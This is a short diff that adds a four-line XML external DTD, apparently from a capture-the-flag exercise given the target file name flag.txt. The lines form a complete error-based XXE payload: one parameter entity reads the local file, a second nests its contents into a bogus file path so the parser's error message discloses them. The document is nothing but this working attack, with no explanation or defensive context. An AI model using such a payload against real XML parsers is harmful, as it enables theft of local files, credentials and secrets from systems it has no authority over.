@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///flag.txt">
+<!ENTITY % make "<!ENTITY &#x25; fail SYSTEM 'file:///missing/%file;'>">
+%make;
+%fail;
